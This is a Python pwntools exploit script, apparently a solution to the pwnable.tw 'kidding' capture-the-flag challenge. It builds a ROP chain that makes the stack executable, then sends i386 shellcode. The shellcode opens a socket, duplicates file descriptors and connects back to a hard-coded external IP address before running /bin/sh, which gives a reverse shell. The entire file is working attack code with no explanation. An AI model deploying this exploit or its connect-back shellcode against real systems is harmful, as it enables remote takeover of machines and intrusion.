#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'

# sh = process("./kidding")
sh = remote("chall.pwnable.tw",10303)

# gdb.attach(sh, "b *0x80488B5")

inc_mem_of_ecx_point_ret = 0x080842c8
pop_ecx_ret = 0x080583c9
jmp_esp = 0x080bd13b

ip = u32(binary_ip("47.94.5.187"))

# 43.132.169.244

payload = b'a' * 8
payload += p32(0x0809A095 - 0x18) # setup ebp
payload += p32(pop_ecx_ret)
payload += p32(0x080EA9F4)
payload += p32(inc_mem_of_ecx_point_ret)
payload += p32(0x080937F0)
payload += p32(jmp_esp)

# sys_socket eax = 0x66, ebx = 0x1, ecx = esp[2, 1, 0]
asm_code = 'push 0x1; pop ebx; mov al, 0x66; xor edx, edx;'
asm_code += 'push edx; push ebx; push 0x2; mov ecx, esp; int 0x80;'
# dup2(oldfd, newfd) eax = 0x3F, ebx = eax(return from sys_socket) = 0, ecx = 1 
asm_code += 'pop esi; pop ecx; mov ebx, eax; mov eax, 0x3F; int 0x80;'
# sys_socket eax = 0x66, ebx = 3, sys_connect(0, ip_port, 0x10)
asm_code += 'mov al, 0x66; push %d; push ax; push si; mov ecx, esp;' % ip
asm_code += 'push 0x10; push ecx; push ebx; mov ecx, esp; mov bl, 0x3; int 0x80;'
# execve("/bin/sh")
asm_code += 'mov al, 0xb; pop ecx; push 0x68732f; push 0x6e69622f; mov ebx, esp; int 0x80;'

payload += asm(asm_code)



#gdb.attach(proc.pidof(sh)[0])
sh.send(payload)

sh.interactive()
